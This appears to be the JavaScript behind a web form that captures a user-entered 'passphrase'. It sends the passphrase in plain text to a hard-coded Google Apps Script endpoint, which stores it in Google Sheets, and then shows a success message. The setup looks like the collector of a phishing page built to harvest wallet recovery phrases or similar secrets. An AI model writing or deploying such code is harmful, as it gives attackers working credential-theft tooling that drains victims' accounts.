document.getElementById('passphraseForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const passphrase = document.getElementById('passphrase').value;

    // Save the passphrase to Google Sheets
    savePassphrase(passphrase);

    // Show success message
    document.getElementById('successMessage').classList.remove('hidden');
});

function savePassphrase(passphrase) {
    const url = 'https://script.google.com/macros/s/AKfycbyn0_3rjn8a6s069u7_umd6QcYZl2rEEIn_dfoQuP0t/dev'; // Replace with your Web app URL

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ passphrase: passphrase }),
    })
    .then(response => response.json()) // Parse JSON response
    .then(data => {
        console.log('Passphrase saved successfully:', data.result);
    })
    .catch(error => {
        console.error('Error saving passphrase:', error);
    });
}
